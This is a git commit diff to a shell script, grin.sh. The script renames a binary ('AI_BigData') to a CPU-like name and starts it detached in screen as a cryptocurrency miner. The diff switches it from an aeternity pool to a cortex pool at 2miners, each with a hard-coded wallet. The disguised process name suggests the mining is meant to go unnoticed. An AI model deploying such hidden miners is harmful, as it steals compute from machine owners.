420a8f4e75e610d3231c4d0b78d2806165f04c6f
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2021-06-11 17:40:49 +0700

    Update grin.sh

--- grin.sh
+++ grin.sh
@@ -15,4 +15,4 @@ mv AI_BigData $azure -n
 cp $azure "$cpuname"
 rm -f  AI_BigData
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --algo aeternity --server ae.2miners.com:4040 --user ak_2CjiGwMxYidY1V4UBv9BAaFacC327opUNhERvFeFVzSz4UNAk1
+screen -d -m ./"${cpuname}" --algo cortex --server ctxc.2miners.com --port 12222 --user 0xf1836ed48c99064bb60465995bbccf87b67e4377 --ssl 1
